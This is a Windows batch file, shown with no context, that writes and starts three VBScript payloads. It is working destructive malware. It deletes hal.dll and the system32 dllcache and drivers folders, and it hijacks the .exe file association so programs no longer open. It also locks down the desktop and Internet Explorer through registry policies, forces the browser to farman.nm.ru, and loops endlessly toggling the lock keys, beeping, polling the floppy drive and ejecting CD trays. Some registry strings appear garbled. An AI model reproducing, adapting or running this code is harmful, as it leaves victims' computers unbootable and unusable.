@echo off
echo Chr(39)>%temp%\temp1.vbs
echo Chr(39)>%temp%\temp2.vbs
echo on error resume next > %temp%\temp.vbs
echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp.vbs
echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp.vbs
reg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v nodesktop /d 1 /freg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /d "http:\\www.farman.nm.ru" /f
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoSelectDownloadDir" /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v "IExplorer" /d 0 /f
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoFindFiles" /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoNavButtons" /d 1 /f
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs
echo fso.deletefile sr+"\system32\hal.dll",1 >> %temp%\temp.vbs
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs
echo fso.deletefolder sr+"\system32\dllcache",1 >> %temp%\temp.vbs
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs
echo fso.deletefolder sr+"\system32\drives",1 >> %temp%\temp.vbs
echo s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","������� ������">>%temp%\temp.vbs
echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","�����">>%temp%\temp.vbs
echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","��������">>%temp%\temp.vbs
echo on error resume next > %temp%\temp1.vbs
echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp1.vbs
echo do>>%temp%\temp1.vbs
echo fso.getfile ("A:\")>>%temp%\temp1.vbs
echo loop>>%temp%\temp1.vbs
echo on error resume next > %temp%\temp2.vbs
echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp2.vbs
echo do>>%temp%\temp2.vbs
echo execute"S.Run ""%comspec% /c echo "" & Chr(7), 0, True">>%temp%\temp2.vbs
echo loop>>%temp%\temp2.vbs
echo set application=createobject("shell.application")>>%temp%\temp.vbs
echo application.minimizeall>>%temp%\temp.vbs
reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f
echo Set IE = CreateObject("InternetExplorer.Application") >> %temp%\temp.vbs
echo IE.Visible = 1 >> %temp%\temp.vbs
echo IE.Navigate "http:\\www.farman.nm.ru" >> %temp%\temp.vbs
echo While IE.Busy >> %temp%\temp.vbs
echo WScript.Sleep 200 >> %temp%\temp.vbs
echo Wend >> %temp%\temp.vbs
echo do >> %temp%\temp.vbs
echo wscript.sleep 200 >> %temp%\temp.vbs
echo s.sendkeys"{capslock}" >> %temp%\temp.vbs
echo wscript.sleep 200 >> %temp%\temp.vbs
echo s.sendkeys"{numlock}" >> %temp%\temp.vbs
echo wscript.sleep 200 >> %temp%\temp.vbs
echo s.sendkeys"{scrolllock}" >> %temp%\temp.vbs
echo loop>> %temp%\temp.vbs
echo Set oWMP = CreateObject("WMPlayer.OCX.7") >> %temp%\temp.vbs
echo Set colCDROMs = oWMP.cdromCollection >> %temp%\temp.vbs
echo if colCDROMs.Count ^>= 1 then >> %temp%\temp.vbs
echo For i = 0 to colCDROMs.Count - 1 >> %temp%\temp.vbs
echo colCDROMs.Item(i).eject >> %temp%\temp.vbs
echo next >> %temp%\temp.vbs
echo End If >> %temp%\temp.vbs

start %temp%\temp.vbs
start %temp%\temp1.vbs
start %temp%\temp2.vbs

